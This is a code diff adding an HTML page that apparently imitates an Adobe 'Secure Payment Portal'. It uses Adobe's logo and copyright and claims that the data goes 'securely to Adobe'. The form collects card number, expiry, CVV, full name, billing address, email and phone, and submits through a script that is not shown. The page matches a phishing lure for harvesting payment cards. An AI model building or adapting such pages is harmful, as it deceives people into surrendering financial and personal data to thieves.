@@ -1,0 +1,106 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>payment page</title>
+    <link rel="stylesheet" href="./style.css" />
+    <script src="./index.js"></script>
+  </head>
+  <body>
+    <header class="head">
+      <h3>
+        <img class="secure-img" src="./images/Adobe-icon-png-red.png" /> Secure
+        Payment Portal
+      </h3>
+      <div>
+        <h3><a class="out" href="./index.html">sign out</a></h3>
+      </div>
+    </header>
+
+    <div class="please">
+      <p class="h3">
+        Please provide Your Card information. This information will be sent
+        securely to Adobe
+      </p>
+      <p class="your">Your payment method</p>
+    </div>
+    <p class="visa">visa <img class="card" src="./images/card.webp" /></p>
+
+    <div class="mime">
+      <img class="credit" src="./images/credit.png" />Credit/debit
+    </div>
+    <div class="lable">
+      <label
+        ><input
+          type="number"
+          id="cardDetails"
+          placeholder="card Number "
+          required
+          maxlength="25" />
+        <input
+          class="month"
+          id="Month"
+          type="month"
+          placeholder="MM/YY"
+          required />
+        <input class="pin" id="Cvv" type="123" placeholder="cvv" required
+      /></label>
+    </div>
+    <div class="First">
+      <label
+        ><input class="FirstName" type="name" placeholder="FirstName" required
+      /></label>
+      <label
+        ><input
+          class="secondname"
+          type="name"
+          placeholder="SecondName"
+          required
+      /></label>
+    </div>
+    <div>
+      <label
+        ><input
+          class="Billing"
+          type="address"
+          name="address"
+          placeholder="Billing address"
+          required
+      /></label>
+    </div>
+    <div class="First">
+      <label
+        ><input class="city" type="name" placeholder="City" required
+      /></label>
+      <label
+        ><input class="state" type="state" placeholder="State" required
+      /></label>
+    </div>
+    <div class="First">
+      <label
+        ><input class="zip" type="number" placeholder="pincode" required
+      /></label>
+      <label
+        ><input
+          class="country"
+          type="name"
+          placeholder="Country/Region"
+          required
+      /></label>
+    </div>
+    <div class="First">
+      <h3>Option</h3>
+      <label
+        ><input class="email" type="email" placeholder="Email" required
+      /></label>
+      <label
+        ><input class="phone" type="number" placeholder="phoneno" required
+      /></label>
+    </div>
+    <div>
+      <button class="submit" onclick="return submitPayment()">Submit</button>
+    </div>
+    <footer>Copyright © 2025 Adobe. All rights reserved.</footer>
+  </body>
+</html>
